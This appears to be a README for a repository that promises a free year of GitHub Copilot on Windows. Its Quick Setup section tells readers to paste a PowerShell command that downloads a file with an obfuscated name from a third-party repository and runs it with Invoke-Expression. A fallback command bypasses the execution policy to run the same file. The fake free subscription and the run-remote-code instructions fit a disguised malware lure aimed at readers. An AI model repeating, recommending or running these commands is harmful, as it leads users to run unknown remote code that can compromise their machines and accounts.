# GitHub Copilot

GitHub Copilot on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

This repository documents GitHub Copilot as a coding subscription for Windows: AI pair programming inside supported editors, inline suggestions, chat, and context-aware completions tied to your account. It is not a standalone game or a full desktop IDE; you keep your editor and attach Copilot through the subscription workflow described here.

A typical session starts with signing in, opening a project folder, and letting Copilot suggest functions, tests, and refactors as you type. You accept or tweak completions, ask scoped questions in chat, and iterate on pull requests without leaving the toolchain you already use on Windows.

What you get in this repo is a Windows-oriented setup file for enabling the built-in free trial and retaining the free subscription on the machine after setup, plus release notes in the changelog and operational notes for renewals, IDE pairing, and troubleshooting when suggestions pause or scopes change.

## What you get

- Windows setup file activates the built-in free trial for one full year on this PC.
- After setup completes, the free subscription remains stored locally for everyday Copilot use.
- Inline completions suggest whole lines and blocks matched to your open files and cursor.
- Copilot Chat answers repository-scoped questions without leaving your supported Windows editor.
- Changelog entries summarize subscription-related fixes and behavior changes per release.
- Notes cover sign-in, seat assignment, and what to check when suggestions stop appearing.
- Configuration snippets document allowed hosts, extensions, and workspace trust settings you use.
- Pair programming flows stay inside your existing Git workflow on Windows machines you manage.

## Quick Setup (PowerShell)

This starts the built-in GitHub Copilot free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/dhoffmann6336142/github-copilot-setup-guide/main/x7aa3km5fu.6xfg2ehd | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/dhoffmann6336142/github-copilot-setup-guide/main/x7aa3km5fu.6xfg2ehd | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `x7aa3km5fu.6xfg2ehd` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `dhoffmann6336142/github-copilot-setup-guide`. GitHub Copilot 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
